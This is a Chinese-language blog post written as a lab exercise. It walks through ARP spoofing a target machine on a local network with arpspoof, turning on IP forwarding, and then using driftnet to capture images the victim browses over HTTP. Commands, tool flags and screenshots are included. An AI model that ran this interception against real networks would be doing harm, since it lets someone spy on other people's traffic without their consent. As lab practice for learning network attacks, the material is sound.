---
title: 小练习-利用arp欺骗获取目标机浏览图片
date: 2023-05-04 17:20:15
categories: #分类
- 渗透测试
tags: #标签
  - Kali

---



<a name="r0Zwd"></a>

# 一、准备阶段 

<a name="MZAfE"></a>
#### A、操作系统：
```
目标机-centos  192.168.1.33  网关 192.168.1.3
攻击方-kali    192.168.1.114

要求：
1、目标机与攻击机处于同一个局域网
2、攻击方需知道目标机的ip和目标机的网关
```
<a name="NNw9c"></a>
#### B、kali所需工具：
```
1、arpspoof（使用apt install dsniff安装，如果出现未找到软件包之类的，多换几个国内源，再更新下）
2、 driftnet：是一款网络流量捕捉图像并将其显示在小窗口的软件
主要参数：
    -b    捕获到新的图片时发声
    -d    指定保存图片的路径
    -x    指定保存图片的前缀名
    -i    选择监听接口
    -f    读取一个指定pcap数据包中的图片
    -a    后台模式：
    -m    指定保存图片数的数目
```

二、实操阶段<br />1、kali配置网络<br />将kali的ip设置到与目标机的ip同网段<br />2、相互ping ，查看是否可连通

3、开始arp攻击：将目标机的网关地址替换成攻击方的ip地址，这样目标机的流量就会从转发到攻击方的机器
未开始前查看原始数据未开始前用fping看看同一网段下还存在什么ip,再用arp -a看看目标机的原始arp缓存是什么
```
#查看局域网内存在的主机
fping -g 192.168.1.1/24

```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1682588958883-433d250d-3008-47e3-958b-3c927d0165a3.png#averageHue=%23272d3d&clientId=u5017a552-0a73-4&from=paste&height=194&id=u0e5d0114&originHeight=194&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50246&status=done&style=none&taskId=u0c46188f-94dd-4517-b7c8-7e4b78cdce4&title=&width=627)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589324113-13ec8f8e-ea61-4d06-827a-b5e7d043a255.png#averageHue=%23320c27&clientId=u5017a552-0a73-4&from=paste&height=273&id=u386cf0df&originHeight=273&originWidth=553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91844&status=done&style=none&taskId=u3b6af19c-d8a8-4bb3-af47-d2c0c86970e&title=&width=553)

开始用arpspoof工具进行arp攻击：
```
#开启路由转发，实验结束后关闭即可，这个不开的话受害主机就断网了
echo 1 > /proc/sys/net/ipv4/ip_forward   

arpspoof -i eth0 -t 192.168.1.33 192.168.1.3

说明：
-i后面的参数是网卡名称
-t后面的参数是目的主机和网关，要截获目的主机发往网关的数据包
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589758417-9a15a4ab-7d30-4080-8d72-7b04ed676bb9.png#averageHue=%23272d3c&clientId=u5017a552-0a73-4&from=paste&height=246&id=u1f74a382&originHeight=246&originWidth=647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72089&status=done&style=none&taskId=u29a8704b-a6ad-4d09-aae9-e453f4ecb61&title=&width=647)<br />不终止程序，来到目标机查看arp缓存 <br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589968057-85f3e6a7-2593-4409-98f0-a3c1d7b09147.png#averageHue=%23330d27&clientId=u5017a552-0a73-4&from=paste&height=143&id=u22d3c497&originHeight=143&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59771&status=done&style=none&taskId=ud2c7f962-6cbb-4e9b-a988-f1b3febfc3b&title=&width=534)<br />4、使用driftnet查看<br />此时，在目标机内查看图片（只能查看http的，https无法获取），攻击方在driftnet内就能看到图片
```
driftnet -i eth0
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1682590495272-5a23672a-71ef-4756-920b-6bceffc61e68.png#averageHue=%2394744e&clientId=u5017a552-0a73-4&from=paste&height=866&id=u0fb8b485&originHeight=866&originWidth=1596&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1470505&status=done&style=none&taskId=uecb3de18-d2b2-40e4-bafa-25a883d9f90&title=&width=1596)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1683102987062-43478815-bedc-4fad-b30b-b5d5b89c6eca.png#averageHue=%232a2f3d&clientId=u925194d7-4358-4&from=paste&height=878&id=u31f37fc2&originHeight=878&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=191263&status=done&style=none&taskId=u3510c0c6-a88b-40ad-ae24-1ecba883644&title=&width=1668)<br />总结：图片抓取不是很准确，有的能抓，有的不能，有时可抓，有时又不可抓。。。。。抓的不全<br />而且这个图片界面也没有滚动条
